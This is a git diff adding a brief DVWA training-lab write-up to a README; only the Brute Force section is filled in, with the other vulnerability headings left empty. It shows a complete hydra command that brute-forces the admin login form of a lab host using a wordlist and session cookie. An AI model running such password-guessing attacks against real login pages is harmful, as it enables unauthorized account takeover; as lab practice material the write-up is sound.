@@ -33,19 +33,64 @@
 
 
 ### Brute Force
+
+
+The goal is to brute force an HTTP login page.
+
+**Security level is currently: low.**
+
+On submitting the username and password we see that it is using get request 
+
+<img width="477" alt="image" src="https://user-images.githubusercontent.com/79740895/185153021-af373095-102b-4d68-88c7-573499351bc5.png">
+
+So let’s use hydra for brute force:
+
+``` 
+hydra -l admin -P /root/Desktop/test-list.txt -o /root/Desktop/brute-attack.txt 192.168.56.101 http-get-form "/dvwa/vulnerabilities/brute/:username=^USER^&password=^PASS^&Login=Login:Username and/or password incorrect.:H=Cookie: security=low; PHPSESSID=rt5o26sooph0v8p5nuarofj346"
+```
+
+Here we are using cookies because if we are not authenticated when we make the login attempts, we will be redirected to default login page
+
+
+---
+
 ### Command Injection
+
+---
 ### Cross Site Request Forgery (CSRF)
+
+---
 ### File Inclusion
+
+---
 ### File Upload
+
+---
 ### SQL Injection
+
+---
 ### SQL Injection (Blind)
+
+---
 ### Weak Session IDs
+
+---
 ### DOM Based Cross Site Scripting (XSS)
+
+---
 ### Reflected Cross Site Scripting (XSS)
+
+---
 ### Stored Cross Site Scripting (XSS)
+
+---
 ### Content Security Policy (CSP) Bypass
+
+---
 ### JavaScript Attacks
 
+
+---
 
 Markdown is a lightweight and easy-to-use syntax for styling your writing. It includes conventions for
 
